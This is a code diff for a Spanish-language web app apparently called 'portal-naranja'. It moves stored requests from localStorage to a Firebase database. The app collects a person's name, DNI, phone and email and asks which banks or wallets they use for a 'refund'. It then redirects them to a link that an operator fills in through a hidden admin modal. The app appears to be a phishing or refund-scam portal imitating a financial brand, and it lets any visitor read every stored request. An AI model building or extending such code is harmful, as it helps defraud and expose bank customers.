@@ -1,13 +1,27 @@
+// Importar Firebase SDK desde CDN oficial
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+import { getDatabase, ref, push, get, child } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+// Tus credenciales oficiales de Firebase integradas
+const firebaseConfig = {
+  apiKey: "AIzaSyDHcfixcpUU4O-RYLmfNzTUDZFB13jEt5s",
+  authDomain: "portal-naranja-763f4.firebaseapp.com",
+  databaseURL: "https://portal-naranja-763f4-default-rtdb.firebaseio.com",
+  projectId: "portal-naranja-763f4",
+  storageBucket: "portal-naranja-763f4.firebasestorage.app",
+  messagingSenderId: "908694133500",
+  appId: "1:908694133500:web:1808b481eeb45c305c9579"
+};
+
+// Inicializar Firebase
+const appFB = initializeApp(firebaseConfig);
+const db = getDatabase(appFB);
+
 class App {
   constructor() {
     this.state = {
       currentScreen: 1,
-      client: {
-        name: '',
-        dni: '',
-        phone: '',
-        email: ''
-      },
+      client: { name: '', dni: '', phone: '', email: '' },
       currentCategory: null,
       currentOrderId: null,
       claimAmount: '',
@@ -27,8 +41,7 @@ class App {
   }
 
   formatCurrencyInput(inputElement) {
-    const formatted = this.formatNumberToAR(inputElement.value);
-    inputElement.value = formatted;
+    inputElement.value = this.formatNumberToAR(inputElement.value);
   }
 
   goToScreen(screenNumber) {
@@ -38,11 +51,7 @@ class App {
   }
 
   updateScreen() {
-    const screens = [
-      'screen-1', 'screen-2', 'screen-3',
-      'flow-app-issues', 'flow-payments', 'flow-transfers'
-    ];
-    
+    const screens = ['screen-1', 'screen-2', 'screen-3', 'flow-app-issues', 'flow-payments', 'flow-transfers'];
     screens.forEach(id => {
       const el = document.getElementById(id);
       if (el) el.classList.add('hidden');
@@ -65,20 +74,15 @@ class App {
   updateProgress(current, total, labelText, percentText) {
     const progressContainer = document.getElementById('progress-container');
     progressContainer.classList.remove('hidden');
-    
     document.getElementById('step-label').innerText = labelText;
     document.getElementById('step-percent').innerText = percentText;
-    
-    const percentage = (current / total) * 100;
-    document.getElementById('progress-bar').style.width = `${percentage}%`;
+    document.getElementById('progress-bar').style.width = `${(current / total) * 100}%`;
   }
 
   handleClientSubmit(e) {
     e.preventDefault();
-    const nameInput = document.getElementById('client-name').value.trim();
-    
     this.state.client = {
-      name: nameInput,
+      name: document.getElementById('client-name').value.trim(),
       dni: document.getElementById('client-dni').value.trim(),
       phone: document.getElementById('client-phone').value.trim(),
       email: document.getElementById('client-email').value.trim()
@@ -94,7 +98,6 @@ class App {
 
   selectCategory(category) {
     this.state.currentCategory = category;
-    
     document.getElementById('screen-3').classList.add('hidden');
     document.getElementById('progress-container').classList.add('hidden');
 
@@ -111,13 +114,12 @@ class App {
     }
   }
 
-  // --- FLUJO A: PROBLEMAS CON LA APP ---
   resetApp() {
     window.location.reload();
   }
 
   // --- FLUJO B: PAGOS / RESUMEN ---
-  generatePaymentOrder() {
+  async generatePaymentOrder() {
     const rawAmount = document.getElementById('pay-amount').value.trim();
     const paymentType = document.getElementById('pay-type').value;
 
@@ -142,12 +144,14 @@ class App {
       selectedBanks: [],
       paymentUrl: '',
       status: 'Pendiente de Link',
-      createdAt: new Date().toISOString()
+      createdAt: Date.now()
     };
 
-    let requests = JSON.parse(localStorage.getItem('nx_platform_requests') || '[]');
-    requests.unshift(newRequest);
-    localStorage.setItem('nx_platform_requests', JSON.stringify(requests));
+    try {
+      await push(ref(db, 'requests'), newRequest);
+    } catch (error) {
+      console.error("Error al guardar en Firebase:", error);
+    }
 
     document.getElementById('display-order-id').innerText = orderId;
     document.getElementById('display-order-amount').innerText = `$${formattedAmount}`;
@@ -156,19 +160,31 @@ class App {
     document.getElementById('pay-waiting-view').classList.remove('hidden');
   }
 
-  checkPaymentStatus() {
-    const requests = JSON.parse(localStorage.getItem('nx_platform_requests') || '[]');
-    const currentReq = requests.find(r => r.id === this.state.currentOrderId);
+  async checkPaymentStatus() {
+    try {
+      const snapshot = await get(child(ref(db), 'requests'));
+      if (snapshot.exists()) {
+        const data = snapshot.val();
+        let foundUrl = '';
+        Object.values(data).forEach(req => {
+          if (req.id === this.state.currentOrderId && req.paymentUrl) {
+            foundUrl = req.paymentUrl;
+          }
+        });
 
-    if (currentReq && currentReq.paymentUrl && currentReq.paymentUrl.trim() !== '') {
-      alert('Ya se Generó tu Link de Pago');
-      window.location.href = currentReq.paymentUrl;
-    } else {
-      alert('Aún estamos procesando tu solicitud. Por favor, reintenta en un momento.');
+        if (foundUrl) {
+          alert('Ya se Generó tu Link de Pago');
+          window.location.href = foundUrl;
+        } else {
+          alert('Aún estamos procesando tu solicitud. Por favor, reintenta en un momento.');
+        }
+      }
+    } catch (e) {
+      alert('Verificando estado...');
     }
   }
 
-  // --- FLUJO C: TRANSFERENCIAS / COMPRAS Y REINTEGRO ---
+  // --- FLUJO C: TRANSFERENCIAS / REINTEGRO ---
   goToBankSelection() {
     const rawAmount = document.getElementById('claim-amount').value.trim();
     if (!rawAmount) {
@@ -176,7 +192,6 @@ class App {
       return;
     }
     this.state.claimAmount = this.formatNumberToAR(rawAmount);
-
     document.getElementById('claim-form-view').classList.add('hidden');
     document.getElementById('claim-banks-view').classList.remove('hidden');
   }
@@ -186,7 +201,7 @@ class App {
     const selected = Array.from(checkboxes).map(cb => cb.value);
 
     if (selected.length === 0) {
-      alert('Por favor, selecciona al menos una entidad bancaria o billetera virtual donde poseas cuenta.');
+      alert('Por favor, selecciona al menos una entidad bancaria o billetera virtual.');
       return;
     }
 
@@ -195,7 +210,7 @@ class App {
     document.getElementById('claim-instructions-view').classList.remove('hidden');
   }
 
-  generateReimbursementOrder() {
+  async generateReimbursementOrder() {
     const orderId = '#TR-' + Math.floor(1000 + Math.random() * 9000);
     this.state.currentOrderId = orderId;
 
@@ -211,12 +226,14 @@ class App {
       selectedBanks: this.state.selectedBanks,
       paymentUrl: '',
       status: 'Pendiente de Link',
-      createdAt: new Date().toISOString()
+      createdAt: Date.now()
     };
 
-    let requests = JSON.parse(localStorage.getItem('nx_platform_requests') || '[]');
-    requests.unshift(newClaim);
-    localStorage.setItem('nx_platform_requests', JSON.stringify(requests));
+    try {
+      await push(ref(db, 'requests'), newClaim);
+    } catch (error) {
+      console.error("Error al guardar en Firebase:", error);
+    }
 
     document.getElementById('display-claim-id').innerText = orderId;
     document.getElementById('display-claim-amount').innerText = `$${this.state.claimAmount}`;
@@ -225,19 +242,30 @@ class App {
     document.getElementById('claim-waiting-view').classList.remove('hidden');
   }
 
-  checkReimbursementStatus() {
-    const requests = JSON.parse(localStorage.getItem('nx_platform_requests') || '[]');
-    const currentReq = requests.find(r => r.id === this.state.currentOrderId);
+  async checkReimbursementStatus() {
+    try {
+      const snapshot = await get(child(ref(db), 'requests'));
+      if (snapshot.exists()) {
+        const data = snapshot.val();
+        let foundUrl = '';
+        Object.values(data).forEach(req => {
+          if (req.id === this.state.currentOrderId && req.paymentUrl) {
+            foundUrl = req.paymentUrl;
+          }
+        });
 
-    if (currentReq && currentReq.paymentUrl && currentReq.paymentUrl.trim() !== '') {
-      alert('Ya se Generó tu Link de Reintegro');
-      window.location.href = currentReq.paymentUrl;
-    } else {
-      alert('Aún estamos procesando tu solicitud de reintegro. Por favor, reintenta en un momento.');
+        if (foundUrl) {
+          alert('Ya se Generó tu Link de Reintegro');
+          window.location.href = foundUrl;
+        } else {
+          alert('Aún estamos procesando tu solicitud de reintegro. Por favor, reintenta en un momento.');
+        }
+      }
+    } catch (e) {
+      alert('Verificando estado...');
     }
   }
 
-  // --- MODAL ADMIN OCULTO ---
   openAdminModal() {
     document.getElementById('admin-auth-modal').classList.remove('hidden');
   }
